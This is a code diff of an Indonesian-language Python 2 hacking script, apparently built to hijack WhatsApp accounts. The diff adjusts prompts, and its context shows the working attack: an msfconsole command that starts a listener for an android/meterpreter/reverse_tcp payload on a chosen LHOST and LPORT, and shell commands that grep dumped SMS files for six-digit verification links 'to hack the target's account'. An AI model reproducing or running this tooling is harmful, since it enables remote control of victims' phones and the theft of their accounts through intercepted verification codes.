@@ -149,12 +149,14 @@ def extract_wa():
 	nxt()
 	flush(hijau+'Membuka Msfconsole ... ')
 	remote()
+	logo()
 	flush(putih+'Buka link Verifikasi yang paling Atas')
 	flush('Untuk Meretas akun Target')
+	flush('Jika link tidak Muncul, ulangi dump_sms')
 	print putih+'---------------------------------------------------'
 	print cyan
-	os.system('chmod +x link.txt')
 	os.system('cat *txt | grep -o [a-z.]*/[0-9][0-9][0-9][0-9][0-9][0-9] > link.txt')
+	os.system('chmod +x link.txt')
 	f= open("link.txt")
 	if f.mode == "r":
 		T= f.read()
@@ -247,18 +249,15 @@ def remote():
     print (''+putih)
     os.system('ifconfig | grep -o [0-9][0-9][.][0-9][.][0-9][0-9][.][0-9][0-9][0-9] > ip.txt')
     f = open('ip.txt')
-    g = f.read()
-    if g == '':
-    	print (merah+'[!]'+putih+' IP tidak terdeteksi Aktifkan OpenVPN')
-    	out()
-	f.close
-    print (merah+'___________________«»')
-    print putih+"IP Local Mu"
+    g = merah+f.read()
+    print '' 
+    print g
+    f.close
+    print putih+'Jika IP diatas kosong, Aktifkan OpenVPN'
     print "\x1b[1;91m----------------------------------------------"
-    print " pastekan IP Tun0 inet disini"
+    print " Masukan IP "
     lh =raw_input(" LHOST : ")
     if lh== '':
-      logo()
       print merah+"[!] Harus DiIsi"
       time.sleep(1)
       os.system("clear")
@@ -278,6 +277,7 @@ def remote():
       os.system("clear")
       os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+      os.system('clear')
 
 
     
